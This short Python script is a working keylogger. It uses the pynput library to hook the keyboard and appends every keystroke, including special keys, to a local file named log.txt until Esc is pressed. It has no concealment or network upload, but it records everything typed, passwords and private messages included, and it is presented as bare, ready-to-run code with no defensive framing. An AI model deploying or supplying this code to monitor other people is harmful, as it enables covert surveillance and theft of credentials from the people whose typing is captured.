from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as f:
        try:     
            f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write('[' + str(key) + ']')
        if key == keyboard.Key.esc:
            return False

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()